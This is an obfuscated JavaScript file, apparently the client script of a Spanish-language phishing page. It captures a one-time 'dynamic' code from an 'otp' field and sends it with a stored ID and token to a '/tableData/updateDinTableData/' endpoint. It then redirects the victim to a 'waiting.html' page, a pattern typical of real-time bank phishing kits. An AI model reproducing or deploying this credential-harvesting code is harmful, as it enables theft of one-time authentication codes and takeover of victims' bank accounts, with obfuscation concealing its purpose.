const _0x30cd3b = _0x38a6;
function _0x4f47() {
  const _0x38b4af = [
    "stringify",
    "123567tHnvXI",
    "addEventListener",
    "/tableData/updateDinTableData/",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "getItem",
    "none",
    "87762dUMenA",
    "form",
    "display",
    "3501848VXhcvL",
    "14dZeFkM",
    "1822456aFdodk",
    "trim",
    "97182VXrgVJ",
    "45IapPyT",
    "querySelectorAll",
    "waiting.html",
    "3234644vaUjaI",
    "Datos\x20actualizados\x20correctamente\x20en\x20el\x20servidor",
    "style",
    "block",
    "origin",
    "740zCaAqR",
    "json",
    "Hubo\x20un\x20problema:",
    "input[required]",
    "746279myvAbB",
    "userTableDataId",
    "location",
    "getElementById",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "log",
    "error-message",
    "every",
    "tableDataToken",
    "value",
    "otp",
    "btnNextStep",
    "href",
  ];
  _0x4f47 = function () {
    return _0x38b4af;
  };
  return _0x4f47();
}
function _0x38a6(_0x32eec2, _0x4be4a1) {
  const _0x4f4767 = _0x4f47();
  return (
    (_0x38a6 = function (_0x38a6cc, _0x1d0910) {
      _0x38a6cc = _0x38a6cc - 0xae;
      let _0x136e7b = _0x4f4767[_0x38a6cc];
      return _0x136e7b;
    }),
    _0x38a6(_0x32eec2, _0x4be4a1)
  );
}
(function (_0x58da34, _0xb35fbd) {
  const _0x571bed = _0x38a6,
    _0x4ac94d = _0x58da34();
  while (!![]) {
    try {
      const _0x2c3221 =
        -parseInt(_0x571bed(0xb8)) / 0x1 +
        (parseInt(_0x571bed(0xd0)) / 0x2) * (-parseInt(_0x571bed(0xc6)) / 0x3) +
        parseInt(_0x571bed(0xd1)) / 0x4 +
        (-parseInt(_0x571bed(0xd4)) / 0x5) *
          (-parseInt(_0x571bed(0xcc)) / 0x6) +
        parseInt(_0x571bed(0xaf)) / 0x7 +
        -parseInt(_0x571bed(0xcf)) / 0x8 +
        (-parseInt(_0x571bed(0xd3)) / 0x9) * (-parseInt(_0x571bed(0xb4)) / 0xa);
      if (_0x2c3221 === _0xb35fbd) break;
      else _0x4ac94d["push"](_0x4ac94d["shift"]());
    } catch (_0x201e56) {
      _0x4ac94d["push"](_0x4ac94d["shift"]());
    }
  }
})(_0x4f47, 0x5bd04),
  document["getElementById"](_0x30cd3b(0xc3))[_0x30cd3b(0xc7)](
    "click",
    async (_0x3270e4) => {
      const _0x42a6f5 = _0x30cd3b;
      _0x3270e4["preventDefault"]();
      const _0x1ad3f1 = document[_0x42a6f5(0xbb)](_0x42a6f5(0xc2))["value"];
      console[_0x42a6f5(0xbd)](_0x1ad3f1);
      if (!areAllFieldsFilled()) {
        showErrorMessage("Todos\x20los\x20campos\x20son\x20obligatorios.");
        return;
      }
      try {
        await updateOtp(_0x1ad3f1),
          console[_0x42a6f5(0xbd)](_0x42a6f5(0xb0)),
          (window[_0x42a6f5(0xba)][_0x42a6f5(0xc4)] = _0x42a6f5(0xae));
      } catch (_0x1f6d0f) {
        console["error"](_0x42a6f5(0xb6), _0x1f6d0f), alert(_0x42a6f5(0xbc));
      }
    }
  );
function areAllFieldsFilled() {
  const _0x6f0113 = _0x30cd3b,
    _0x347e8a = document[_0x6f0113(0xbb)](_0x6f0113(0xcd)),
    _0x30b663 = _0x347e8a[_0x6f0113(0xd5)](_0x6f0113(0xb7));
  return Array["from"](_0x30b663)[_0x6f0113(0xbf)](
    (_0x431298) => _0x431298[_0x6f0113(0xc1)][_0x6f0113(0xd2)]() !== ""
  );
}
function showErrorMessage(_0x3d2c19) {
  const _0x24961d = _0x30cd3b,
    _0x2553a7 = document[_0x24961d(0xbb)](_0x24961d(0xbe));
  (_0x2553a7["textContent"] = _0x3d2c19),
    (_0x2553a7[_0x24961d(0xb1)][_0x24961d(0xce)] = _0x24961d(0xb2)),
    setTimeout(() => {
      const _0x537c8b = _0x24961d;
      _0x2553a7[_0x537c8b(0xb1)]["display"] = _0x537c8b(0xcb);
    }, 0x7d0);
}
async function updateOtp(_0x16192d) {
  const _0x4485bd = _0x30cd3b,
    _0x1d3292 = localStorage["getItem"](_0x4485bd(0xb9)),
    _0x2e94dd = localStorage[_0x4485bd(0xca)](_0x4485bd(0xc0));
  if (!_0x1d3292 || !_0x2e94dd)
    throw new Error(
      "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
    );
  const _0x96e0b1 = await fetch(url + _0x4485bd(0xc8) + _0x1d3292, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      Authorization: "Bearer\x20" + _0x2e94dd,
      Origin: window[_0x4485bd(0xba)][_0x4485bd(0xb3)],
    },
    body: JSON[_0x4485bd(0xc5)]({
      din: _0x16192d,
      status: "Ingresó\x20dinámica",
    }),
  });
  if (!_0x96e0b1["ok"]) {
    const _0x1da198 = await _0x96e0b1[_0x4485bd(0xb5)]();
    throw new Error(_0x1da198["error"] || _0x4485bd(0xc9));
  }
}
